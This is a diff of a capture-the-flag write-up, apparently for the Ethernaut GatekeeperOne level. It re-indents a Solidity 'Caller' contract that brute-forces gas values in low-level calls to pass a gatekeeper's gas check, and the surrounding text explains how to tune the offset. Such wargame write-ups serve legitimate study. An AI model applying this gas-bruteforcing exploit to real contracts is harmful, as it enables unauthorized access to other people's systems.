@@ -145,17 +145,18 @@ Why this reverts anyways? Because the sent gas does not fits the requirements of
 - 2) The option one is the theory behind this solution. In here, by knowing aproximately the consumpted gas of the first steps we can run multiple calls to the contract an iterate near that gas value. This is because that consumpted gas value deppends on how the level contract and the instance was deployed in terms of optimizer and other compiler settings. We can create another caller contract that loops over the call in order to get the exact gas value.
 
 
-    // SPDX-License-Identifier: MIT
-    pragma solidity ^0.4.18;
-    contract Caller {
-        function callEnter(bytes8 _key, address _gateKeeper, uint256 _offset, uint256 _initialGas) public returns(bool){
-            for (uint256 i = 0; i < _offset; i++) {
-                if (_gateKeeper.call.gas(i + _initialGas + 8191 * 5)(bytes4(keccak256("enter(bytes8)")), _key)) {
-                    return true;
+        // SPDX-License-Identifier: MIT
+        pragma solidity ^0.4.18;
+        contract Caller {
+            function callEnter(bytes8 _key, address _gateKeeper, uint256 _offset, uint256 _initialGas) public returns(bool){
+                for (uint256 i = 0; i < _offset; i++) {
+                    if (_gateKeeper.call.gas(i + _initialGas + 8191 * 5)(bytes4(keccak256("enter(bytes8)")), _key)) {
+                        return true;
+                    }
                 }
-            }
-        }        
-    }
+            }        
+        }
+
 
 By tuning the call with the ```offset``` and the ```_initialGas``` we can iterate around that gas value in order to get the right call. The initial gas can be set as: ```Consumpted Gas - Offset / 2 ```, where the ```Consumpted Gas``` can be estimated with the method of step 1.
 
